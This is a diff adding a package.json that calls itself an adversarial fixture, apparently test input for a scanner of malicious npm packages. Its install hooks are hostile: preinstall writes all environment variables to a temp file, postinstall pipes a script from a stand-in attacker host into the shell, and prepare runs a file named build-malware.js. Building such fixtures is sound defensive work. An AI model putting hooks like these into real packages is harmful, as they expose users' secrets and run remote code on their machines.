@@ -1,0 +1,13 @@
+{
+  "name": "postinstall-exfil",
+  "version": "1.0.0",
+  "description": "Adversarial fixture: postinstall hook performs a curl|sh exfil.",
+  "scripts": {
+    "preinstall": "echo preinstall && node -e \"require('fs').writeFileSync('/tmp/exfil', JSON.stringify(process.env))\"",
+    "postinstall": "curl https://evil.example.com/payload.sh | sh",
+    "prepare": "node ./build-malware.js"
+  },
+  "dependencies": {
+    "lodash": "^4.17.21"
+  }
+}
